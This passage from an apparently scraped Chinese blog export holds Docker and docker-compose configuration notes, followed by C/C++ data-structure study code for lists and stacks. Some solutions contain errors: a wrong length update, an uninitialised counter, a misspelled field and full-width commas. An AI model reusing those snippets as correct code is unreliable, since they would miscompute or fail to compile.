&lt;value&gt; USER：镜像正在运行时设置一个UID。语法如下：1USER &lt;uid&gt; VOLUME：授权访问从容器内到主机上的目录。语法如下：1VOLUME [\"/data\"] 例子123456789101112131415 # base imageFROM centos# MAINTAINERMAINTAINER json_hc@163.com# put nginx-1.12.2.tar.gz into &#x2F;usr&#x2F;local&#x2F;src and unpack nginxADD nginx-1.12.2.tar.gz &#x2F;usr&#x2F;local&#x2F;src# running required commandRUN yum install -y gcc gcc-c++ glibc make autoconf openssl openssl-devel RUN yum install -y libxslt-devel -y gd gd-devel GeoIP GeoIP-devel pcre pcre-develRUN useradd -M -s &#x2F;sbin&#x2F;nologin nginx# change dir to &#x2F;usr&#x2F;local&#x2F;src&#x2F;nginx-1.12.2WORKDIR &#x2F;usr&#x2F;local&#x2F;src&#x2F;nginx-1.12.2# execute command to compile nginxRUN .&#x2F;configure --user&#x3D;nginx --group&#x3D;nginx --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --with-file-aio --with-http_ssl_module --with-http_realip_module --with-http_addition_module --with-http_xslt_module --with-http_image_filter_module --with-http_geoip_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_auth_request_module --with-http_random_index_module --with-http_secure_link_module --with-http_degradation_module --with-http_stub_status_module &amp;&amp; make &amp;&amp; make installEXPOSE 80 Docker-compose在测试目录中，执行以下命令来启动应用程序： 1docker-compose up 如果你想在后台执行该服务可以加上 -d 参数： 1docker-compose up -d docker-compose.yml的指令 version指定本 yml 依从的 compose 哪个版本制定的。 build指定为构建镜像上下文路径： 例如 webapp 服务，指定为从上下文路径 ./dir/Dockerfile 所构建的镜像： 1234version: &quot;3.7&quot;services: webapp: build: .&#x2F;dir 或者，作为具有在上下文指定的路径的对象，以及可选的 Dockerfile 和 args： 12345678910111213version: &quot;3.7&quot;services: webapp: build: context: .&#x2F;dir dockerfile: Dockerfile-alternate args: buildno: 1 labels: - &quot;com.example.description&#x3D;Accounting webapp&quot; - &quot;com.example.department&#x3D;Finance&quot; - &quot;com.example.label-with-empty-value&quot; target: prod context：上下文路径。dockerfile：指定构建镜像的 Dockerfile 文件名。args：添加构建参数，这是只能在构建过程中访问的环境变量。labels：设置构建镜像的标签。target：多层构建，可以指定构建哪一层。 cap_add，cap_drop添加或删除容器拥有的宿主机的内核功能。 12345cap_add: - ALL # 开启全部权限cap_drop: - SYS_PTRACE # 关闭 ptrace权限 cgroup_parent为容器指定父 cgroup 组，意味着将继承该组的资源限制。 1cgroup_parent: m-executor-abcd command覆盖容器启动的默认命令。 1command: [&quot;bundle&quot;, &quot;exec&quot;, &quot;thin&quot;, &quot;-p&quot;, &quot;3000&quot;] container_name指定自定义容器名称，而不是生成的默认名称。 1container_name: my-web-container depends_on设置依赖关系。 docker-compose up ：以依赖性顺序启动服务。在以下示例中，先启动 db 和 redis ，才会启动 web。docker-compose up SERVICE ：自动包含 SERVICE 的依赖项。在以下示例中，docker-compose up web 还将创建并启动 db 和 redis。docker-compose stop ：按依赖关系顺序停止服务。在以下示例中，web 在 db 和 redis 之前停止。 1234567891011version: &quot;3.7&quot;services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres 注意：web 服务不会等待 redis db 完全启动 之后才启动。devices指定设备映射列表。 12devices: - &quot;&#x2F;dev&#x2F;ttyUSB0:&#x2F;dev&#x2F;ttyUSB0&quot; dns自定义 DNS 服务器，可以是单个值或列表的多个值。 12345dns: 8.8.8.8dns: - 8.8.8.8 - 9.9.9.9 dns_search自定义 DNS 搜索域。可以是单个值或列表。 12345dns_search: example.comdns_search: - dc1.example.com - dc2.example.com entrypoint覆盖容器默认的 entrypoint。 1entrypoint: &#x2F;code&#x2F;entrypoint.sh 也可以是以下格式： 1234567entrypoint: - php - -d - zend_extension&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20100525&#x2F;xdebug.so - -d - memory_limit&#x3D;-1 - vendor&#x2F;bin&#x2F;phpunit env_file从文件添加环境变量。可以是单个值或列表的多个值。 1env_file: .env 也可以是列表格式： 1234env_file: - .&#x2F;common.env - .&#x2F;apps&#x2F;web.env - &#x2F;opt&#x2F;secrets.env environment添加环境变量。您可以使用数组或字典、任何布尔值，布尔值需要用引号引起来，以确保 YML 解析器不会将其转换为 True 或 False。 123environment: RACK_ENV: development SHOW: &#39;true&#39; expose暴露端口，但不映射到宿主机，只被连接的服务访问。 仅可以指定内部端口为参数： 123expose: - &quot;3000&quot; - &quot;8000&quot; extra_hosts添加主机名映射。类似 docker client –add-host。 123extra_hosts: - &quot;somehost:162.242.195.82&quot; - &quot;otherhost:50.31.209.229&quot; 以上会在此服务的内部容器中 /etc/hosts 创建一个具有 ip 地址和主机名的映射关系： 12162.242.195.82 somehost50.31.209.229 otherhost healthcheck用于检测 docker 服务是否健康运行。 123456healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http:&#x2F;&#x2F;localhost&quot;] # 设置检测程序 interval: 1m30s # 设置检测间隔 timeout: 10s # 设置检测超时时间 retries: 3 # 设置重试次数 start_period: 40s # 启动后，多少秒开始启动检测程序 image指定容器运行的镜像。以下格式都可以： 123456image: redisimage: ubuntu:14.04image: tutum&#x2F;influxdbimage: example-registry.com:4000&#x2F;postgresqlimage: a4bc65fd # 镜像idlogging 服务的日志记录配置。 driver：指定服务容器的日志记录驱动程序，默认值为json-file。有以下三个选项 123driver: &quot;json-file&quot;driver: &quot;syslog&quot;driver: &quot;none&quot; 仅在 json-file 驱动程序下，可以使用以下参数，限制日志得数量和大小。 12345logging: driver: json-file options: max-size: &quot;200k&quot; # 单个文件大小为200k max-file: &quot;10&quot; # 最多10个文件 当达到文件限制上限，会自动删除旧得文件。 syslog 驱动程序下，可以使用 syslog-address 指定日志接收地址。 1234logging: driver: syslog options: syslog-address: &quot;tcp:&#x2F;&#x2F;192.168.0.42:123&quot; network_mode设置网络模式。 12345network_mode: &quot;bridge&quot;network_mode: &quot;host&quot;network_mode: &quot;none&quot;network_mode: &quot;service:[service name]&quot;network_mode: &quot;container:[container name&#x2F;id]&quot; networks 配置容器连接的网络，引用顶级 networks 下的条目 。 12345678910111213141516services: some-service: networks: some-network: aliases: - alias1 other-network: aliases: - alias2networks: some-network: # Use a custom driver driver: custom-driver-1 other-network: # Use a custom driver which takes special options driver: custom-driver-2 aliases ：同一网络上的其他容器可以使用服务名称或此别名来连接到对应容器的服务。 restartno：是默认的重启策略，在任何情况下都不会重启容器。always：容器总是重新启动。on-failure：在容器非正常退出时（退出状态非0），才会重启容器。unless-stopped：在容器退出时总是重启容器，但是不考虑在Docker守护进程启动时就已经停止了的容器restart: “no”restart: alwaysrestart: on-failurerestart: unless-stopped注：swarm 集群模式，请改用 restart_policy。 secrets存储敏感数据，例如密码： 12345678910111213version: &quot;3.1&quot;services:mysql: image: mysql environment: MYSQL_ROOT_PASSWORD_FILE: &#x2F;run&#x2F;secrets&#x2F;my_secret secrets: - my_secretsecrets: my_secret: file: .&#x2F;my_secret.txt security_opt修改容器默认的 schema 标签。 12345security-opt： - label:user:USER # 设置容器的用户标签 - label:role:ROLE # 设置容器的角色标签 - label:type:TYPE # 设置容器的安全策略标签 - label:level:LEVEL # 设置容器的安全等级标签 stop_grace_period指定在容器无法处理 SIGTERM (或者任何 stop_signal 的信号)，等待多久后发送 SIGKILL 信号关闭容器。 12stop_grace_period: 1s # 等待 1 秒stop_grace_period: 1m30s # 等待 1 分 30 秒 默认的等待时间是 10 秒。 stop_signal设置停止容器的替代信号。默认情况下使用 SIGTERM 。 以下示例，使用 SIGUSR1 替代信号 SIGTERM 来停止容器。 1stop_signal: SIGUSR1 sysctls设置容器中的内核参数，可以使用数组或字典格式。 1234567sysctls: net.core.somaxconn: 1024 net.ipv4.tcp_syncookies: 0sysctls: - net.core.somaxconn&#x3D;1024 - net.ipv4.tcp_syncookies&#x3D;0 tmpfs在容器内安装一个临时文件系统。可以是单个值或列表的多个值。 12345tmpfs: &#x2F;runtmpfs: - &#x2F;run - &#x2F;tmp ulimits覆盖容器默认的 ulimit。 12345ulimits: nproc: 65535 nofile: soft: 20000 hard: 40000 volumes将主机的数据卷或着文件挂载到容器里。 1234567version: &quot;3.7&quot;services: db: image: postgres:latest volumes: - &quot;&#x2F;localhost&#x2F;postgres.sock:&#x2F;var&#x2F;run&#x2F;postgres&#x2F;postgres.sock&quot; - &quot;&#x2F;localhost&#x2F;data:&#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;data&quot;","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.cfyqy.com/tags/docker/"}],"author":"ye1s"},{"title":"c++思维导图","slug":"c-思维导图","date":"2019-04-12T15:11:00.000Z","updated":"2020-04-13T08:12:36.446Z","comments":true,"path":"article/4589eaf5.html","link":"","permalink":"https://blog.cfyqy.com/article/4589eaf5.html","excerpt":"网上搜罗的c++导图","text":"网上搜罗的c++导图","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"c++","slug":"c","permalink":"https://blog.cfyqy.com/tags/c/"},{"name":"编程语言","slug":"编程语言","permalink":"https://blog.cfyqy.com/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"}],"author":"ye1s"},{"title":"数据结构整理","slug":"结构整理","date":"2019-04-08T04:19:00.000Z","updated":"2020-04-13T08:31:51.034Z","comments":true,"path":"article/d0f18447.html","link":"","permalink":"https://blog.cfyqy.com/article/d0f18447.html","excerpt":"已经一年半没有碰过c语言了，c语言编程这块，有点荒废。最近有点想要去学习一下linux的内核，挺高深的，感觉自己有点儿自不量力。不过，趁现在还空闲，就折腾一下吧，准备将数据结构重新再学习一下，将知识点整理成思维导图，让自己好记一些。","text":"已经一年半没有碰过c语言了，c语言编程这块，有点荒废。最近有点想要去学习一下linux的内核，挺高深的，感觉自己有点儿自不量力。不过，趁现在还空闲，就折腾一下吧，准备将数据结构重新再学习一下，将知识点整理成思维导图，让自己好记一些。 思维导图0x1 概述 0x2线性表 0x3栈 0x4队列 0x5递归 0x6树和二叉树 代码实现线性表0x1 顺序表0x1.1基本操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt; #include&lt;malloc.h&gt;#define MaxSize 50typedef int ElemType; //ElemType类型实际上是inttypedef struct&#123; ElemType data[MaxSize]; //存放顺序表中的元素 int length; //顺序表的长度&#125;SqList; //SequenceList,顺序表//建议： ;typedef SqList *List; void InitList(SqList *&amp;L) //初始化&#123; L=(SqList *)malloc(sizeof(SqList)); //分配存放线性表的空间 L-&gt;length=0;&#125; void DestroyList(SqList *&amp;L)//销毁线性表 &#123; free(L); &#125; bool ListEmpty(SqList *L)//判断是否为空 &#123; return(L-&gt;length==0); &#125; int ListLength(SqList *L) //求线性表的长度 &#123; return(L-&gt;length); &#125; void DispList( SqList *L)//输出线性表 &#123; int i; if (ListEmpty(L)) return; for (i=0;i&lt;L-&gt;length;i++) printf(\"%d\",L-&gt;data[i]); printf(\"\\n\"); &#125; bool GetElem(SqList *L,int i,ElemType &amp;e)//获取第i个元素 &#123; if (i&lt;1 || i&gt;L-&gt;length) return false; e=L-&gt;data[i-1]; return true;&#125;int LocateElem(SqList *L, ElemType e)//按元素查找&#123; for(int i=0; i&lt;L-&gt;length;i++) if(L-&gt;data[i]==e) return i+1; //返回元素的逻辑位序 return 0;&#125;bool ListInsert(SqList *&amp;L,int i,ElemType e)//插入元素e&#123; int j; if (i&lt;1 || i&gt;L-&gt;length+1) return false; //参数错误时返回false i--; //将顺序表逻辑序号转化为物理序号 for(j=L-&gt;length;j&gt;i;j--) //将data[i..n]元素后移一个位置 L-&gt;data[j]=L-&gt;data[j-1]; L-&gt;data[i]=e; //插入元素e L-&gt;length++; //顺序表长度增1 return true; //成功插入返回true&#125;bool ListDelete(SqList *&amp;L,int i,ElemType &amp;e)//删除元素e&#123; if (i&lt;1 || i&gt;L-&gt;length) //删除位置不合法 return false; i--; //将顺序表逻辑序号转化为物理序号 e=L-&gt;data[i]; for (int j=i;j&lt;L-&gt;length-1;j++) L-&gt;data[j]=L-&gt;data[j+1]; L-&gt;length--; //顺序表长度减1 return true; &#125;void CreateList(SqList *&amp;L,int n)//创建 顺序表 &#123; int i; L-&gt;length=n; printf(\"请输入线性表la的元素共%d个\\n\",n); for(i=0;i&lt;n;i++) &#123; scanf(\"%d\",&amp;L-&gt;data[i]); &#125;&#125;int main()&#123; List la; int i,j; int e,m; printf(\"初始化线性表\\n\"); InitList(la); printf(\"请输入线性表的长度:\"); scanf(\"%d\",&amp;m); CreateList(la,m); DispList(la); printf(\"请输入你要查找的元素位置:\"); scanf(\"%d\",&amp;j); GetElem(la,j,e); printf(\"第%d处的元素为%d\\n\",j,e); printf(\"输入你要查找的元素:\"); scanf(\"%d\",&amp;e); j=LocateElem(la,e); printf(\"%d元素在%d处\\n\",e,j); printf(\"请输入要插入的元素以及元素位置:\"); scanf(\"%d%d\",&amp;e,&amp;j); ListInsert(la,j,e); DispList(la); printf(\"请输入要删除的元素位置:\") ; scanf(\"%d\",&amp;j); ListDelete(la,j,e); printf(\"删除%d元素成功!\",e); system(\"pause\"); return 0; &#125; 0x1.2 题型0x1.2.1 已知长度为n的线性表A采用顺序存储结构，编写一个时间复杂度为O(n)、空间复杂度为O(1)的算法，该算法删除元素值在[x,y] 之间的所有元素解法一: 1234567891011void delnode(SqList *&amp;L,ElemType x，ElemType y)&#123; int k=0,i; //k记录值不在[x,y]元素个数 for (i=0;i&lt;L-&gt;length;i++) if (!(L-&gt;data[i]&gt;=x &amp;&amp; L-&gt;data[i]&lt;=y )) //若当前元素不在[x,y],将其插入L中 &#123; L-&gt;data[k]=L-&gt;data[i]; k++; //不在[x,y]的元素增1 &#125; L-&gt;length-=k; //顺序表L的长度等于k&#125; 解法二 12345678910void delnode1(SqList *&amp;L,ElemType x，ElemType y)&#123; int i,k; for(i=0;i&lt;L-&gt;Lenth;i++) &#123; if(x&lt;=L-&gt;data[i] &amp;&amp; L-&gt;data[i]&lt;=y) k++； else L-&gt;data[i-k]=L-&gt;data[i]; &#125; L-&gt;Lenth-=k;&#125; 0x1.2.2 有一个顺序表L，元素类型为整型。设计一算法，以第一个元素为轴，所有小于等于它的元素移到该元素前面，所有大于它的元素移动到该元素后面解法一 1234567891011121314151617181920void move1(SqList *&amp;L)&#123; int i=0,j=L-&gt;length-1; ElemType pivot=L-&gt;data[0]; //以data[0]为基准 ElemType tmp; while (i&lt;j) //从区间两端交替向中间扫描,直至i=j为止 &#123; while (i&lt;j &amp;&amp; L-&gt;data[j]&gt;pivot) j--; //从右向左扫描,找一个小于等于pivot的元素 while (i&lt;j &amp;&amp; L-&gt;data[i]&lt;=pivot) i++; //从左向右扫描,找一个大于pivot的元素 if (i&lt;j) &#123; tmp=L-&gt;data[i];//将L-&gt;data[i]和L-&gt;data[j]交换 L-&gt;data[i]=L-&gt;data[j]; L-&gt;data[j]=tmp; &#125; &#125; tmp=L-&gt;data[0]; //将L-&gt;data[0]和L-&gt;data[j]进行交换 L-&gt;data[0]=L-&gt;data[j]; L-&gt;data[j]=tmp; printf(\"i=%d\\n\",i);&#125; 解法二 12345678910111213141516void move2(SqList *&amp;L)&#123; int i=0,j=L-&gt;length-1; ElemType pivot=L-&gt;data[0]; //以data[0]为基准 while (i&lt;j) //从顺序表两端交替向中间扫描,直至i=j为止 &#123; while (j&gt;i &amp;&amp; L-&gt;data[j]&gt;pivot) j--; //从右向左扫描,找一个小于等于pivot的data[j] L-&gt;data[i]=L-&gt;data[j]; //将其放入data[i]处 i++; while (i&lt;j &amp;&amp; L-&gt;data[i]&lt;=pivot) i++; //从左向右扫描,找一个大于pivot的记录data[i] L-&gt;data[j]=L-&gt;data[i]; //将其放入data[j]处 j--; &#125; L-&gt;data[i]=pivot; printf(\"i=%d\\n\",i);&#125; 0x2 单链表0x2.1基本操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176#include &lt;iostream&gt;using namespace std;typedef int ElemType;typedef struct LNode //定义单链表结点类型&#123; ElemType data; struct LNode *next; //指向后继结点&#125; LNode,*LinkList;void InitList(LinkList &amp;L);void CreateListF(LinkList &amp;L,int n); void CreateListR(LinkList &amp;L,int n);bool ListEmpty(LinkList L);void DispList(LinkList L);void DestroyList(LinkList &amp;L);bool ListInsert(LinkList &amp;L,int i,ElemType e);bool ListDelete_L(LinkList &amp;L,int i,ElemType &amp;e);void sort(LinkList &amp;L);void split(LinkList &amp;L,LinkList &amp;L1,LinkList &amp;L2);int Find(LinkList L, int m );bool GetElem(LinkList L,int i,ElemType &amp;e);int main() &#123; LinkList L,L1,L2; int n,m; ElemType e; cout&lt;&lt;\"请输入要创建链表元素个数:\"&lt;&lt;endl; cin&gt;&gt;n; cout&lt;&lt;\"请输入\"&lt;&lt;n&lt;&lt;\"个链表元素。\"&lt;&lt;endl; CreateListR(L,n); cout&lt;&lt;\"请输入要查找的元素位置:\"&lt;&lt;endl; cin&gt;&gt;m; GetElem(L,m,e); cout&lt;&lt;\"该元素为:\"&lt;&lt;e&lt;&lt;endl; cout&lt;&lt;\"请输入要插入的元素以及元素位置:\"&lt;&lt;endl; cin&gt;&gt;e&gt;&gt;m; ListInsert(L,m,e); DispList(L); cout&lt;&lt;endl; cout&lt;&lt;\"请输入要删除的元素位置:\"&lt;&lt;endl; cin&gt;&gt;m; ListDelete_L(L,m,e); DispList(L); DestroyList(L); //DispList(L); system(\"pause\"); return 0;&#125;void InitList(LinkList &amp;L)&#123; L=new LNode; //创建头结点 L-&gt;next=NULL;&#125;void CreateListF(LinkList &amp;L,int n)&#123; int i; LinkList s; L=new LNode; L-&gt;next=NULL; for(i=1;i&lt;=n;i++)&#123; s=new LNode; cin&gt;&gt;s-&gt;data; s-&gt;next=L-&gt;next; L-&gt;next=s; &#125;&#125;void CreateListR(LinkList &amp;L,int n)&#123; int i; LinkList s,r; L=new LNode; L-&gt;next=NULL; r=L; for(i=1;i&lt;=n;i++)&#123; s=new LNode; cin&gt;&gt;s-&gt;data; r-&gt;next=s; r=s; &#125; r-&gt;next=NULL;&#125;void DispList(LinkList L)&#123; LinkList p; int flag=1; p=L-&gt;next; while(p)&#123; if(flag) &#123; cout&lt;&lt;p-&gt;data;flag=0; &#125; else &#123; cout&lt;&lt;\" \"&lt;&lt;p-&gt;data; &#125; p=p-&gt;next; &#125;&#125;void DestroyList(LinkList &amp;L)&#123; LinkList p=L; while(L)&#123; p=L; L=L-&gt;next; delete p; &#125;&#125;bool ListInsert(LinkList &amp;L,int i,ElemType e)//在第i处插入e元素 &#123; int j=0; LinkList p=L,s; while(p&amp;&amp;j&lt;i-1)&#123; p=p-&gt;next;j++; &#125; if(p==NULL) return false; s=new LNode; s-&gt;data=e; s-&gt;next=p-&gt;next; p-&gt;next=s; return true;&#125;bool ListDelete_L(LinkList &amp;L,int i,ElemType &amp;e)&#123; int j=0; LinkList p=L,s,q; while(p&amp;&amp;j&lt;i-1)&#123; p=p-&gt;next;j++; &#125; if(p==NULL) return false; q=p-&gt;next; e=q-&gt;data; p-&gt;next=q-&gt;next; delete q; return true;&#125;void split(LinkList &amp;L,LinkList &amp;L1,LinkList &amp;L2)&#123; LinkList p=L-&gt;next,r,q;//r为L1尾指针，q为L2指针 L1=L;r=L1; L1-&gt;next=NULL; //重构L1 L2=new LNode;//初始化L2 L2-&gt;next=NULL; while(p)&#123; r-&gt;next=p;//尾插插入L1 r=p; //修改尾指针 p=p-&gt;next; q=p;//b节点 if(p)&#123; p=p-&gt;next; //保存后继节点 q-&gt;next=L2-&gt;next; L2-&gt;next=q;//头结点插入s &#125; &#125; r-&gt;next=NULL; //L1尾部指针为空 &#125;void sort(LinkList &amp;L)&#123; LinkList p,pre,q; p=L-&gt;next-&gt;next; L-&gt;next-&gt;next=NULL; while(p)&#123; q=p-&gt;next; //p指针保存下，后面要插入链表中，后续关系会变更。 pre=L; while(pre-&gt;next&amp;&amp;pre-&gt;next-&gt;data&lt;p-&gt;data) pre=pre-&gt;next; p-&gt;next=pre-&gt;next;//将*pre之后插入*p pre-&gt;next=p; p=q; &#125;&#125;bool GetElem(LinkList L,int i,ElemType &amp;e)&#123; int j=0; LinkList p=L; //p指向头节点,j置为0(即头节点的序号为0) while (j&lt;i &amp;&amp; p!=NULL) //找第i个节点 &#123; j++; p=p-&gt;next; &#125; if (p==NULL) //不存在第i个数据节点,返回false return false; else //存在第i个数据节点,返回true &#123; e=p-&gt;data; return true; &#125;&#125; 0x2.2例题有一个带头节点的单链表L={a1,b1,a2,b2,…,an,bn}，设计一个算法将其拆分成两个带头节点的单链表L1和L2 12345678910111213141516171819void split(LinkList &amp;L,LinkList &amp;L1,LinkList &amp;L2)&#123; LinkList p=L-&gt;next,r,q;//r为L1尾指针，q为L2指针 L1=L;r=L1; L1-&gt;next=NULL; //重构L1 L2=new LNode;//初始化L2 L2-&gt;next=NULL; while(p)&#123; r-&gt;next=p;//尾插插入L1 r=p; //修改尾指针 p=p-&gt;next; q=p;//b节点 if(p)&#123; p=p-&gt;next; //保存后继节点 q-&gt;next=L2-&gt;next; L2-&gt;next=q;//头结点插入s &#125; &#125; r-&gt;next=NULL; //L1尾部指针为空 &#125; 有一个带头节点的单链表L（至少有一个数据节点），设计一个算法使其元素递增有序排列。 1234567891011121314void sort(LinkList &amp;L)&#123; LinkList p,pre,q; p=L-&gt;next-&gt;next; //p指向L的第2个数据节点 L-&gt;next-&gt;next=NULL; //构造只含一个数据节点的有序表 while (p!=NULL) &#123; q=p-&gt;next; //q保存p节点后继节点的指针 pre=L; //从有序表开头进行比较,pre指向插入p的前驱节点 while (pre-&gt;next!=NULL &amp;&amp; pre-&gt;next-&gt;data&lt;p-&gt;data) pre=pre-&gt;next; //在有序表中找插入*p的前驱节点*pre p-&gt;next=pre-&gt;next;//将pre之后插入p pre-&gt;next=p; p=q; //扫描原单链表余下的节点 &#125;&#125; 0x3 双链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748typedef struct DNode //声明双链表节点类型&#123; ElemType data; struct DNode *prior; //指向前驱节点 struct DNode *next; //指向后继节点 &#125;DLinkList;//在*p结点之后插入结点*ss-&gt;next = p-&gt;nextp-&gt;next-&gt;prior = ss-&gt;prior = pp-&gt;next = s//删除*p结点之后的一个结点 p-&gt;next-&gt;next-&gt;prior = pp-&gt;next = p-&gt;next-&gt;next//头插法 void CreateListF(DLinkNode *&amp;L，ElemType a[]，int n)&#123; DLinkNode *s; int i; L=(DLinkNode *)malloc(sizeof(DLinkNode)); //创建头结点 L-&gt;prior=L-&gt;next=NULL; //前后指针域置为NULL for (i=0;i&lt;n;i++) //循环建立数据结点 &#123; s=(DLinkNode *)malloc(sizeof(DLinkNode)); s-&gt;data=a[i]; //创建数据结点*s s-&gt;next=L-&gt;next; //将*s插入到头结点之后 if (L-&gt;next!=NULL) //若L存在数据结点，修改前驱指针 L-&gt;next-&gt;prior=s; L-&gt;next=s; s-&gt;prior=L; &#125;&#125; //尾插法 void CreateListR(DLinkNode *&amp;L，ElemType a[]，int n)&#123; DLinkNode *s，*r; int i; L=(DLinkNode *)malloc(sizeof(DLinkNode)); //创建头结点 L-&gt;prior=L-&gt;next=NULL; //前后指针域置为NULL r=L; //r始终指向尾结点，开始时指向头结点 for (i=0;i&lt;n;i++) //循环建立数据结点 &#123; s=(DLinkNode *)malloc(sizeof(DLinkNode)); s-&gt;data=a[i]; //创建数据结点*s r-&gt;next=s; s-&gt;prior=r; //将*s插入*r之后 r=s; //r指向尾结点 &#125; r-&gt;next=NULL; //尾结点next域置为NULL&#125; 0x4有序表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//为假设有序表元素是以递增方式排列了简单 //有序顺序表void ListInsert(SqList *&amp;L，ElemType e)&#123; int i=0，j; while (i&lt;L-&gt;length &amp;&amp; L-&gt;data[i]&lt;e) i++; //查找值为e的元素 for (j=ListLength(L);j&gt;i;j--) //将data[i..n]后移一个位置 L-&gt;data[j]=L-&gt;data[j-1]; L-&gt;data[i]=e; L-&gt;length++; //有序顺序表长度增1&#125;//有序单链表的ListInsert() void ListInsert(LinkNode *&amp;L，ElemType e)&#123; LinkNode *pre=L，*p; while (pre-&gt;next!=NULL &amp;&amp; pre-&gt;next-&gt;data&lt;e) pre=pre-&gt;next; //查找插入结点的前驱结点*pre p=new LinkNode; p-&gt;data=e; //创建存放e的数据结点*p p-&gt;next=pre-&gt;next; //在*pre结点之后插入*p结点 pre-&gt;next=p;&#125;//采用顺序表存放有序表时，二路归并算法void UnionList(SqList *LA，SqList *LB，SqList *&amp;LC)&#123; int i=0，j=0，k=0;//i、j分别为LA、LB的下标，k为LC中元素个数 LC=new SqList; //建立有序顺序表LC while (i&lt;LA-&gt;length &amp;&amp; j&lt;LB-&gt;length) &#123; if (LA-&gt;data[i]&lt;LB-&gt;data[j]) &#123; LC-&gt;data[k]=LA-&gt;data[i]; i++;k++; &#125; else //LA-&gt;data[i]&gt;LB-&gt;data[j] &#123; LC-&gt;data[k]=LB-&gt;data[j]; j++;k++; &#125; &#125; while (i&lt;LA-&gt;length) //LA尚未扫描完，将其余元素插入LC中 &#123; LC-&gt;data[k]=LA-&gt;data[i]; i++;k++; &#125; while (j&lt;LB-&gt;length) //LB尚未扫描完，将其余元素插入LC中 &#123; LC-&gt;data[k]=LB-&gt;data[j]; j++;k++; &#125; LC-&gt;length=k;&#125; 栈0x1顺序栈0x1基本操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;malloc.h&gt;#define MaxSize 100typedef char ElemType;typedef struct &#123; ElemType data[MaxSize]; int top; //栈指针&#125; SqStack; //顺序栈类型定义void InitStack(SqStack *&amp;s)&#123; s=(SqStack *)malloc(sizeof(SqStack)); s-&gt;top=-1;&#125; void DestroyStack(SqStack *&amp;s)&#123; free(s);&#125;bool StackEmpty(SqStack *s)&#123; return(s-&gt;top==-1);&#125;bool Push(SqStack *&amp;s,ElemType e)&#123; if (s-&gt;top==MaxSize-1) //栈满的情况，即栈上溢出 return false; s-&gt;top++; s-&gt;data[s-&gt;top]=e; return true;&#125;bool Pop(SqStack *&amp;s,ElemType &amp;e)&#123; if (s-&gt;top==-1) //栈为空的情况，即栈下溢出 return false; e=s-&gt;data[s-&gt;top]; s-&gt;top--; return true;&#125; bool GetTop(SqStack *s,ElemType &amp;e)&#123; if (s-&gt;top==-1) //栈为空的情况，即栈下溢出 return false; e=s-&gt;data[s-&gt;top]; return true;&#125;bool symmetry(ElemType str[])&#123; int i; ElemType e; SqStack *st; InitStack(st); //初始化栈 for (i=0;str[i]!='\\0';i++) //将串所有元素进栈 Push(st,str[i]); //元素进栈 for (i=0;str[i]!='\\0';i++) &#123; Pop(st,e); //退栈元素e if (str[i]!=e) //若e与当前串元素不同则不是对称串 &#123; DestroyStack(st);//销毁栈 return false; &#125; &#125; DestroyStack(st); //销毁栈 return true;&#125;int main()&#123; char str[10]=\"heterh\"; if(symmetry(str)) printf(\"true\"); else printf(\"false\"); return 0;&#125; 题型0x1 编写一个算法利用顺序栈判断一个字符串是否是对称串。所谓对称串是指从左向右读和从右向左读的序列相同 12345678910111213141516bool symmetry(ElemType str[])&#123; int i; ElemType e; SqStack *st; InitStack(st); //初始化栈 for (i=0;str[i]!='\\0';i++) //将串所有元素进栈 Push(st,str[i]); //元素进栈 for (i=0;str[i]!='\\0';i++) &#123; Pop(st,e); //退栈元素e if (str[i]!=e) //若e与当前串元素不同则不是对称串 &#123; DestroyStack(st);//销毁栈 return false; &#125; &#125; DestroyStack(st); //销毁栈 return true;&#125; 0x2中缀表达式转换成后缀表达式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465char trans(char *exp, char postexp[]) &#123; char e; SqStack *Optr; //定义运算符栈指针 InitStack(Optr); //初始化运算符栈 int i=0; //i作为postexp的下标 while (*exp!='\\0') //exp表达式未扫描完时循环 &#123; switch(*exp) &#123; case '(': //判定为左括号 Push(Optr,'('); //左括号进栈 exp++; //继续扫描其他字符 break; case ')': //判定为右括号 Pop(Optr,e); //出栈元素e while (e!='(') //不为'('时循环 &#123; postexp[i++]=e; //将e存放到postexp中 Pop(Optr,e); //继续出栈元素e &#125; exp++; //继续扫描其他字符 break; case '+': //判定为加或减号 case '-': while (!StackEmpty(Optr)) //栈不空循环 &#123; GetTop(Optr,e); //取栈顶元素e if (e!='(') //e不是'(' &#123; postexp[i++]=e; //将e存放到postexp中 Pop(Optr,e); //出栈元素e &#125; else //e是'(时退出循环 break; &#125; Push(Optr,*exp); //将'+'或'-'进栈 exp++; //继续扫描其他字符 break; case '*': //判定为'*'或'/'号 case '/': while (!StackEmpty(Optr)) //栈不空循环 &#123; GetTop(Optr,e); //取栈顶元素e if (e=='*' || e=='/') &#123; postexp[i++]=e; //将e存放到postexp中 Pop(Optr,e); //出栈元素e &#125; else //e为非'*'或'/'运算符时退出循环 break; &#125; Push(Optr,*exp); //将'*'或'/'进栈 exp++; //继续扫描其他字符 break; default: //处理数字字符 while 